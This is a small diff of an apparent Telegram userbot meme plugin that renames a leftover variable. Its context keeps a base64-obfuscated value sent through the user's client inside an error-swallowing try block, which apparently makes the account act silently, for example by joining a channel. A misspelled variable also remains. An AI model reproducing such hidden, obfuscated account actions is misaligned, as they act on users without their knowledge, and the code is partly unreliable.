@@ -190,7 +190,7 @@ async def perbot(permemes):
     try:
         per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         per = Get(per)
-        await catmemes.client(per)
+        await permemes.client(per)
     except BaseException:
         pass
     download_location = await permemes.client.download_media(replied, "./temp/")
@@ -219,7 +219,7 @@ async def perbot(permemes):
     per = f"https://telegra.ph{response[0]}"
     per = await phcomment(per, text, username)
     await permemmes.delete()
-    await permemes.client.send_file(catmemes.chat_id, per, reply_to=replied)
+    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)
 
 
 CMD_HELP.update(
